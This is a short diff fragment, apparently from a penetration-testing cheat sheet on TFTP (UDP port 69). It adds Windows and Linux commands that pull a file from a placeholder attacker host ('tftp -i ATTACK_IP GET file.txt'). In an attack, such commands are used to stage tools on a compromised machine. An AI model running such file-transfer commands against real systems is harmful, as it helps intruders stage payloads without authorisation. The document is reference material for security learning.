@@ -9,6 +9,14 @@ Port 69 UDP
     set tftproot /home/user/scripts
     exploit
 
-### 2) Download file via TFTP
+### 2) Download file via TFTP 
+
+Windows
 
     tftp -i ATTACK_IP GET file.txt
+
+Linux
+
+    tftp ATTACK_IP
+    tftp> get file.txt /tmp/file.txt
+    tftp> quit
